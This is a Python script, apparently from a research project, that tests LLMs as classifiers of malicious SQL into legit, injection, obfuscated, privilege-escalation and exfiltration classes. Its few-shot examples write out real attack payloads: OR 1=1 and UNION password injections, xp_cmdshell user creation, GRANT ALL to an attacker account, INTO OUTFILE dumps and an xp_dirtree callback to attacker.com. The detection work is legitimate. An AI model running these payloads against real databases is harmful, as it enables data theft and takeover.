"""
LLM-детектор вредоносного SQL. Поддерживает несколько провайдеров.

Провайдеры:
    groq       — Groq API (llama-3.3-70b-versatile), бесплатно
    synthetic  — synthetic.new (GLM-5.1, gpt-oss-120b), OpenAI-compatible

Режимы:
    zero_shot  — классификация без примеров
    few_shot   — примеры в промпте

Запуск:
    python src/detector_llm.py --mode few_shot --provider groq
    python src/detector_llm.py --mode few_shot --provider synthetic --model hf:zai-org/GLM-5.1
    python src/detector_llm.py --mode few_shot --provider synthetic --model hf:openai/gpt-oss-120b
"""

import argparse
import json
import os
import re
import time
from pathlib import Path

import pandas as pd
import numpy as np
from dotenv import load_dotenv
from openai import OpenAI
from groq import Groq, RateLimitError
from sklearn.model_selection import train_test_split

from evaluate import metrics_report, save_results

load_dotenv()

DATA_PROCESSED = Path(__file__).parent.parent / "data" / "processed"
RESULTS_DIR = Path(__file__).parent.parent / "results"
RESULTS_DIR.mkdir(exist_ok=True)

# ── Провайдеры ─────────────────────────────────────────────────────────────

PROVIDERS = {
    "groq": {
        "client_fn": lambda: Groq(api_key=os.environ["GROQ_API_KEY"]),
        "default_model": "llama-3.3-70b-versatile",
        "batch_size": 10,
        "sleep_s": 15,  # 70B: ~1400 токенов/батч, лимит 6000/мин → макс 4 батча/мин
    },
    "synthetic": {
        "client_fn": lambda: OpenAI(
            api_key=os.environ["SYNTHETIC_API_KEY"],
            base_url="https://api.synthetic.new/openai/v1",
        ),
        "default_model": "hf:zai-org/GLM-5.1",
        "batch_size": 3,   # thinking-модели генерируют много токенов — меньше батч
        "sleep_s": 8,
    },
}

# Глобальные переменные — инициализируются в main()
_client = None
_model  = None
_batch_size = 10
_sleep_s    = 8

LABEL_MAP = {
    "legit": 0, "legitimate": 0, "safe": 0, "normal": 0,
    "sqli": 1, "sql injection": 1, "injection": 1, "sql_injection": 1,
    "obfuscated": 2, "obfuscation": 2, "encoded": 2,
    "privilege": 3, "privilege escalation": 3, "escalation": 3, "privesc": 3,
    "exfiltration": 4, "data exfiltration": 4, "exfil": 4,
}

LABEL_NAMES = {0: "legit", 1: "sqli", 2: "obfuscated", 3: "privilege", 4: "exfiltration"}

# ── Промпты ────────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are a cybersecurity expert specializing in SQL threat detection.
Classify SQL queries into exactly one of these 5 categories:

- legit: normal SQL with no malicious intent (SELECT/INSERT/UPDATE for business logic)
- sqli: SQL injection (UNION SELECT, OR 1=1, SLEEP(), WAITFOR, boolean/time-based blind)
- obfuscated: attack using encoding to evade filters (hex 0x..., CHAR(), /**/ comments, %xx URL encoding, string concatenation to hide keywords)
- privilege: privilege escalation (GRANT, REVOKE, xp_cmdshell, sp_addsrvrolemember, CREATE USER, ALTER USER, access to sys/mysql.user/pg_shadow)
- exfiltration: data theft (INTO OUTFILE, INTO DUMPFILE, LOAD_FILE, UTL_HTTP, DNS callbacks, SELECT without WHERE on sensitive tables)

Key distinction: obfuscated queries LOOK like encoded/scrambled text even if the underlying attack is sqli."""

FEW_SHOT_EXAMPLES = """
Examples:

SQL: SELECT * FROM orders WHERE user_id = ? ORDER BY created_at DESC
Label: legit

SQL: INSERT INTO logs (event, ts) VALUES ('login', NOW())
Label: legit

SQL: ' OR '1'='1
Label: sqli

SQL: 1 UNION SELECT username, password FROM users--
Label: sqli

SQL: 1; WAITFOR DELAY '0:0:5'--
Label: sqli

SQL: 0x53454c454354202a2046524f4d207573657273
Label: obfuscated

SQL: CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
Label: obfuscated

SQL: SELECT/**/*/**/FROM/**/users
Label: obfuscated

SQL: %27%20OR%20%271%27%3D%271
Label: obfuscated

SQL: GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
Label: privilege

SQL: EXEC xp_cmdshell 'net user hacker P@ss123 /add'
Label: privilege

SQL: SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt'
Label: exfiltration

SQL: EXEC master..xp_dirtree '//attacker.com/share'
Label: exfiltration

SQL: GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';
Label: privilege

SQL: EXEC xp_cmdshell 'net user hacker P@ss /add'
Label: privilege

SQL: SELECT * FROM users INTO OUTFILE '/var/www/dump.txt'
Label: exfiltration

SQL: SELECT table_name FROM information_schema.tables UNION SELECT password FROM mysql.user
Label: exfiltration
"""

ZERO_SHOT_BATCH = """Classify each SQL query below. Reply with ONLY a JSON array of label strings in the same order.
Labels: legit, sqli, obfuscated, privilege, exfiltration

{queries}

Reply with ONLY a JSON array, e.g.: ["legit", "sqli", "obfuscated"]"""

FEW_SHOT_BATCH = FEW_SHOT_EXAMPLES + """
Now classify each query below. Reply with ONLY a JSON array of label strings.

{queries}

Reply with ONLY a JSON array."""

COT_BATCH = FEW_SHOT_EXAMPLES + """
Now classify each query below. For each, write one short reason then the label.
Format strictly:
1. <reason> | Label: <label>
2. <reason> | Label: <label>
...

{queries}"""


BATCH_SIZE = 10  # запросов за один вызов API


# ── Извлечение текста из ответа модели ─────────────────────────────────────

def _extract_content(choice) -> str:
    """
    GLM-5.1 и gpt-oss-120b — thinking-модели:
      - reasoning_content = цепочка рассуждений
      - content = финальный ответ (появляется только после завершения thinking)
    Если content есть — берём его. Иначе ищем финальный ответ
    в последних строках reasoning_content.
    """
    msg = choice.message

    # Финальный ответ есть — берём
    if msg.content:
        return msg.content

    # Достаём reasoning_content
    reasoning = None
    if hasattr(msg, "reasoning_content") and msg.reasoning_content:
        reasoning = msg.reasoning_content
    else:
        try:
            raw = msg.model_dump()
            reasoning = raw.get("reasoning_content") or raw.get("thinking") or raw.get("text")
        except Exception:
            pass

    if not reasoning:
        return ""

    # Модель дописала рассуждение — финальный ответ в конце
    # Ищем последнее вхождение одного из лейблов
    tail = reasoning[-500:]  # последние 500 символов
    return tail


# ── Парсинг ответа ─────────────────────────────────────────────────────────

def _find_label(text: str) -> int:
    t = text.strip().lower()
    for key, val in LABEL_MAP.items():
        if key in t:
            return val
    return -1


def parse_batch_response(text: str, mode: str, n: int) -> list[int]:
    text = text.strip()

    if mode in ("zero_shot", "few_shot"):
        # ожидаем JSON-массив
        m = re.search(r'\[.*?\]', text, re.DOTALL)
        if m:
            try:
                items = json.loads(m.group())
                return [_find_label(str(x)) for x in items][:n]
            except Exception:
                pass
        # фолбэк: каждая строка = один ответ
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        return [_find_label(l) for l in lines[:n]]

    else:  # cot: "1. reason | Label: xxx"
        results = []
        for line in text.splitlines():
            m = re.search(r'label\s*:\s*(\w[\w\s]*)', line, re.IGNORECASE)
            if m:
                results.append(_find_label(m.group(1)))
        return results[:n]


# ── Запрос к API (батч) ────────────────────────────────────────────────────

def classify_batch(queries: list[str], mode: str, retries: int = 3) -> tuple[list[int], float]:
    numbered = "\n".join(f"{i+1}. {q}" for i, q in enumerate(queries))

    is_thinking = isinstance(_client, OpenAI)  # synthetic — thinking models
    base_tokens = 2000 if is_thinking else 60

    if mode == "zero_shot":
        user_content = ZERO_SHOT_BATCH.format(queries=numbered)
        max_tokens = base_tokens
    elif mode == "few_shot":
        user_content = FEW_SHOT_BATCH.format(queries=numbered)
        max_tokens = base_tokens
    else:  # cot
        user_content = COT_BATCH.format(queries=numbered)
        max_tokens = base_tokens if is_thinking else len(queries) * 20

    for attempt in range(retries):
        try:
            t0 = time.perf_counter()
            # thinking-модели (GLM-5.1, gpt-oss-120b) не принимают temperature=0
            kwargs = dict(
                model=_model,
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": user_content},
                ],
                max_tokens=max_tokens,
            )
            if "groq" in str(type(_client).__module__):
                kwargs["temperature"] = 0.0
            response = _client.chat.completions.create(**kwargs)
            elapsed = time.perf_counter() - t0
            raw_text = _extract_content(response.choices[0])
            labels = parse_batch_response(raw_text, mode, len(queries))
            while len(labels) < len(queries):
                labels.append(-1)
            return labels, elapsed

        except RateLimitError:
            print(f"    [rate limit] sleeping 60s...", flush=True)
            time.sleep(60)
        except Exception as e:
            print(f"    [error] {e}, sleeping 10s...", flush=True)
            time.sleep(10)

    return [-1] * len(queries), 0.0


# ── Основной цикл ──────────────────────────────────────────────────────────

def run_llm_detector(df_test: pd.DataFrame, mode: str) -> dict:
    print(f"\n[*] LLM detector | mode={mode} | model={_model} | n={len(df_test)} | batch={_batch_size}", flush=True)

    queries = df_test["query"].tolist()
    labels  = df_test["label"].tolist()

    y_true, y_pred, times = [], [], []
    failed = 0

    for i in range(0, len(queries), _batch_size):
        batch_q = queries[i:i+_batch_size]
        batch_l = labels[i:i+_batch_size]

        preds, elapsed = classify_batch(batch_q, mode)

        for true, pred in zip(batch_l, preds):
            y_true.append(int(true))
            y_pred.append(pred if pred != -1 else 0)
            if pred == -1:
                failed += 1
        times.append(elapsed)

        done = min(i + BATCH_SIZE, len(queries))
        print(f"    batch {i//_batch_size+1}: [{done}/{len(queries)}] failed={failed} ({elapsed*1000:.0f}ms)", flush=True)
        time.sleep(_sleep_s)

    total_time = sum(times)
    print(f"    done. failed_parses={failed}/{len(df_test)}", flush=True)

    return metrics_report(
        np.array(y_true),
        np.array(y_pred),
        f"LLM ({mode})",
        total_time,
        len(df_test),
    )


# ── Main ───────────────────────────────────────────────────────────────────

def main(modes: list[str], n_test: int = 500, dataset_file: str = "dataset.csv",
         provider: str = "groq", model: str | None = None) -> None:
    global _client, _model, _batch_size, _sleep_s

    cfg = PROVIDERS[provider]
    _client     = cfg["client_fn"]()
    _model      = model or cfg["default_model"]
    _batch_size = cfg["batch_size"]
    _sleep_s    = cfg["sleep_s"]

    # Короткое имя модели для имён файлов
    model_slug = _model.replace("hf:", "").replace("/", "-").replace(":", "-")

    print(f"Provider : {provider}")
    print(f"Model    : {_model}")
    print(f"Batch    : {_batch_size}  Sleep: {_sleep_s}s")

    df = pd.read_csv(DATA_PROCESSED / dataset_file, encoding="utf-8")
    df = df.dropna(subset=["query", "label"])
    df["query"] = df["query"].astype(str)

    _, df_test_full = train_test_split(df, test_size=0.2, random_state=42, stratify=df["label"])

    n_per_class = n_test // df["label"].nunique()
    df_sample = pd.concat([
        grp.sample(min(len(grp), n_per_class), random_state=42)
        for _, grp in df_test_full.groupby("label")
    ]).reset_index(drop=True)
    print(f"LLM test sample: {len(df_sample)} examples ({n_per_class} per class)")
    print(df_sample["label_name"].value_counts().to_string())

    results = []
    for mode in modes:
        result = run_llm_detector(df_sample, mode)
        # добавляем имя модели в метод для различия в таблице
        result["method"] = f"LLM {model_slug} ({mode})"
        results.append(result)

    out = RESULTS_DIR / f"llm_results_{model_slug}.csv"
    save_results(results, out)
    print(f"[+] Results -> {out}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", default="few_shot",
                        choices=["zero_shot", "few_shot", "cot", "all"])
    parser.add_argument("--n", type=int, default=500)
    parser.add_argument("--dataset", default="dataset.csv")
    parser.add_argument("--provider", default="groq",
                        choices=["groq", "synthetic"])
    parser.add_argument("--model", default=None,
                        help="Переопределить модель (иначе берётся дефолт провайдера)")
    args = parser.parse_args()

    modes = ["zero_shot", "few_shot", "cot"] if args.mode == "all" else [args.mode]
    main(modes=modes, n_test=args.n, dataset_file=args.dataset,
         provider=args.provider, model=args.model)
